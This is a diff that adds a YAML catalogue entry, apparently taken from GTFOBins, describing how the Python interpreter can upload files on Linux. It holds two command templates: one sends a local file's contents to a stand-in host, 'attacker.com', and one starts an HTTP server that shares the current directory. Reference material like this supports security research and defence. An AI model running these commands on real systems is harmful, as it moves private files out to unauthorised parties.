@@ -1,0 +1,36 @@
+id: gtfobins/python/upload/unprivileged
+type: binary
+platform: linux
+name: python
+phases:
+- exfiltration
+capabilities:
+- file-upload
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'python -c ''import sys
+
+    if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
+
+    else: import urllib as u, urllib2 as r
+
+    r.urlopen("http://attacker.com", open("/path/to/input-file", "rb").read())'''
+- template: 'python -c ''import sys
+
+    if sys.version_info.major == 3: import http.server as s, socketserver as ss
+
+    else: import SimpleHTTPServer as s, SocketServer as ss
+
+    ss.TCPServer(("", 12345), s.SimpleHTTPRequestHandler).serve_forever()'''
+references:
+- https://gtfobins.github.io/gtfobins/python/
+tags:
+- linux
+- unix
+- gtfobins
